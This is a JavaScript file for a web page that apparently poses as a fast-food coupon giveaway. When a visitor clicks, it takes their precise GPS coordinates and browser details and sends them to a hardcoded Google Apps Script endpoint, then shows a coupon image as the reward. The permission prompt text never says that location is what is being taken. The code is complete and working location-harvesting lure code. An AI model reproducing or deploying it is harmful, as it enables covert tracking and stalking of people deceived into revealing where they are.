// Web App URL from Google Apps Script deployment
const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyRuMtjQj06d1BGveMWdM4vWNw9Tysso93gtb7rHyNjfoexLekafuN_5Kms9GOQoook/exec';

const sendBtn = document.getElementById('sendBtn');
const statusEl = document.getElementById('status');

sendBtn && sendBtn.addEventListener('click', () => sendLocation());

function getPositionWithTimeout(options = {}, ms = 60000) {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error('Not supported'));
    let finished = false;
    const timer = setTimeout(() => {
      if (finished) return;
      finished = true;
      reject(new Error('Timeout waiting for position'));
    }, ms);

    navigator.geolocation.getCurrentPosition((pos) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      resolve(pos);
    }, (err) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      reject(err);
    }, options);
  });
}

async function sendLocation(){
  if(!navigator.geolocation){ statusEl.textContent = 'Not supported by this browser.'; return; }
  if (sendBtn) sendBtn.disabled = true;
    statusEl.textContent = 'Requesting — please allow access (will timeout after 60s)...';

  let pos;
  try{
    // Try to get a quick location; 60s timeout to avoid long waits
    pos = await getPositionWithTimeout({ enableHighAccuracy: false }, 60000);
  } catch(err) {
    // If permission denied or timeout, show appropriate message and re-enable
    if (err && err.code === 1) { // PERMISSION_DENIED
      statusEl.textContent = 'denied. Please allow access.';
    } else if (err && err.message === 'Timeout waiting for ...') {
      statusEl.textContent = 'Request timed out. Try again or check device settings.';
    } else {
      statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
    }
    if (sendBtn) sendBtn.disabled = false;
    return;
  }

  const payload = {
    lat: pos.coords.latitude,
    lon: pos.coords.longitude,
    accuracy: pos.coords.accuracy,
    timestamp: new Date(pos.timestamp).toISOString(),
    userAgent: navigator.userAgent
  };

  try{
    // Use JSONP via script tag to avoid CORS issues when page origin is file:// or other origins.
    const params = new URLSearchParams();
    params.set('lat', payload.lat);
    params.set('lon', payload.lon);
    params.set('accuracy', payload.accuracy);
    params.set('timestamp', payload.timestamp);
    params.set('userAgent', encodeURIComponent(payload.userAgent));

    const cbName = '__gps_cb_' + Date.now() + '_' + Math.floor(Math.random()*1000);
    params.set('callback', cbName);
    const url = SCRIPT_URL + '?' + params.toString();

    const script = document.createElement('script');
    const timeout = setTimeout(() => {
      try{ window[cbName] = null; }catch(e){ window[cbName] = null; }
      if (script.parentNode) script.parentNode.removeChild(script);
      statusEl.textContent = 'Server timeout. Click again.';
      if (sendBtn) sendBtn.disabled = false;
    }, 60000);

    window[cbName] = function(data) {
      clearTimeout(timeout);
      try{
        if (data && data.status === 'ok') {
          statusEl.innerHTML = '<img src="assets/img/kfc-coupons.jpg" alt="Saved" style="max-width:100%;display:block;" />';
        } else {
          statusEl.textContent = 'Server error: ' + (data && data.message ? data.message : 'unknown');
        }
      } finally {
        try{ delete window[cbName]; }catch(e){ window[cbName] = null; }
        if (script.parentNode) script.parentNode.removeChild(script);
        if (sendBtn) sendBtn.disabled = false;
      }
    };

    script.src = url;
    script.async = true;
    document.head.appendChild(script);
  } catch(err){
    statusEl.textContent = 'Network error: ' + err.message;
    if (sendBtn) sendBtn.disabled = false;
  }
}
